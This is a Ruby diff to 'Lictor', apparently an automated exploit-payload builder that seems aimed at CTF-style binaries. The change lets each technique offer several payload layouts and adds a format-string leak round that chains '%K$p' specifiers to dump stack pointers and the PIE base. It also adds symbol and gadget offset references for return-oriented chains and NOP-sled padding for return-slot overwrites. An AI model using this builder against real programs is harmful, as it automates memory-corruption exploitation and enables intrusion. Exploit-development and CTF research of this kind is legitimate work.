@@ -25,7 +25,7 @@ module Lictor
     # technique WINS over the built-in file (packs teach, the builder
     # follows).
     # Returns {path:, offset:, offset_source:, sink:, ret:, ret_source:,
-    # arch:, size:}.
+    # variant:, arch:, size:}.
     def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil, shellcode_path: nil)
       require "augure-profiler" # lazy: metasm loads on the first build only
       facts = Augure::Facts.parse(facts) if facts.is_a?(String)
@@ -48,27 +48,58 @@ module Lictor
         offset = AugureProfiler::Triage.offset(binary)
         offset_source = "gdb-cyclic" if offset
       end
-      unless offset
+
+      layouts = layouts_for(technique, packs)
+      # the measured offset serves the return-slot layouts only: the
+      # fmtstr class addresses the stack through the format itself, the
+      # fmt_offset fact carries the buffer's argument index - no return
+      # slot to measure
+      needs_offset = layouts.any? { |(_, layout)| layout.flatten.include?("measured_offset") }
+      unless offset || !needs_offset
         raise BuildError,
           "no measured offset - static analysis found no controlled return and the debugger did not either"
       end
-
-      layout = layout_for(technique, packs)
       arch = AugureProfiler.arch(binary)
       width = (arch == :x64) ? "Q<" : "L<"
-      body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
+      body = ret = ret_source = variant = nil
+      failures = []
+      layouts.each do |(name, layout)|
+        body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
+        variant = name
+        break
+      rescue BuildError => e
+        failures << [name, e.message]
+      end
+      raise BuildError, match_failure(technique, failures) if body.nil?
+
       File.binwrite(out, body)
       {path: out, offset: offset, offset_source: offset_source, sink: static&.dig(:sink),
-       ret: ret, ret_source: ret_source, arch: arch, size: body.bytesize}
+       ret: ret, ret_source: ret_source, variant: variant, arch: arch, size: body.bytesize}
     end
 
-    # lictor's data file first; a pack teaching the same technique with
-    # a build: section overrides (packs teach, the builder follows).
-    def layout_for(technique, packs = [])
+    # A technique may ship SEVERAL layouts: the mr5 callme form (PLT
+    # helpers) and the static twin's form (announced-nothing stage
+    # functions) are the same capability, and the facts decide which one
+    # the binary supports. Each candidate carries its name for the trail.
+    def layouts_for(technique, packs = [])
       built_in = YAML.load_file(File.expand_path("../config/build_layouts.yml", __dir__))
-      Array(packs).filter_map(&:build).find { |b| b["technique"] == technique }&.dig("layout") ||
-        built_in.dig(technique, "layout") or
-        raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml"
+      entry = Array(packs).filter_map(&:build).find { |b| b["technique"] == technique } ||
+        built_in[technique]
+      raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml" unless entry
+
+      variants = entry["variants"]
+      return variants.map { |v| [v["name"], v["layout"]] } if variants
+
+      [["default", entry["layout"]]]
+    end
+
+    # Every candidate failed: name each one with its own reason, never a
+    # single opaque message (the operator teaches the missing layout).
+    def match_failure(technique, failures)
+      return "no build layout for #{technique} - teach one in the pack or in build_layouts.yml" if failures.empty?
+
+      details = failures.map { |(name, why)| "#{name}: #{why}" }.join("; ")
+      "no build variant of #{technique} matches the facts (#{details})"
     end
 
     # The layout slots, resolved against the facts and the measurement.
@@ -80,6 +111,26 @@ module Lictor
       ret_source = nil
       layout.each do |slot|
         case slot[0]
+        when "fmtstr_leak"
+          # the leak round: every stack qword from the buffer's own
+          # index rides out as %K$p - the PIE base, the code pointers,
+          # the saved frames. The window is fixed (40 slots): it
+          # reaches the frame chain behind a 256-byte read buffer
+          # (32 buffer qwords + saved rbp + return) while the format
+          # itself still fits that read. The strike derives its
+          # targets from what answers.
+          n = facts["fmt_offset"]&.first&.first
+          unless n
+            raise BuildError,
+              "fmtstr_leak: no fmt_offset fact - the profiler names the buffer's argument index off the frame"
+          end
+
+          n = Integer(n)
+          body << ((n...(n + 40)).map { |k| "%#{k}$p" }.join(" ") + "|")
+          # no return slot rides here: printf consumes the format - the
+          # payload IS the return, the strike derives from what answers
+          ret ||= body.dup
+          ret_source ||= "fmt_offset:#{n}"
         when "padding"
           filler = (slot[2] == "sled") ? "\x90" : "A"
           body << (filler * offset).b
@@ -142,12 +193,13 @@ module Lictor
         raise BuildError, "no win_symbol fact - the winning function's address is unknown" unless win
 
         [win[1], "win_symbol:#{win[0]}@#{win[1]}"]
-      when /\Agadget:(.+)\z/
+      when /\Agadget:(.+?)(?:\+(\d+))?\z/
         type = Regexp.last_match(1)
+        add = (Regexp.last_match(2) || 0).to_i
         gadget = facts["gadget"]&.find { |t, _| t == type }
         raise BuildError, "no #{type} gadget in the facts" unless gadget
 
-        [gadget[1], "gadget:#{type}@#{gadget[1]}"]
+        [gadget[1] + add, "gadget:#{type}#{"+#{add}" if add.positive?}@#{gadget[1]}"]
       when /\Aleak:(.+)\z/
         name = Regexp.last_match(1)
         leak = facts["leaked_address"]&.find { |n, _| n == name }
@@ -168,9 +220,19 @@ module Lictor
         [entry[1], "got_addr:#{name}@#{entry[1]}"]
       when /\Aconst:(\d+)\z/
         [Regexp.last_match(1).to_i, "const:#{Regexp.last_match(1)}"]
+      when /\Asym:(.+?)(?:\+(\d+))?\z/
+        name = Regexp.last_match(1)
+        add = (Regexp.last_match(2) || 0).to_i
+        entry = facts["sym_addr"]&.find { |n, _| n == name }
+        unless entry
+          raise BuildError,
+            "no sym_addr(\"#{name}\") fact - the symbol is not in the binary's table, profile it first"
+        end
+
+        [entry[1] + add, "sym_addr:#{name}#{"+#{add}" if add.positive?}@#{entry[1]}"]
       else
         raise BuildError,
-          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | const:N)"
+          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | sym:NAME | const:N)"
       end
     end
 
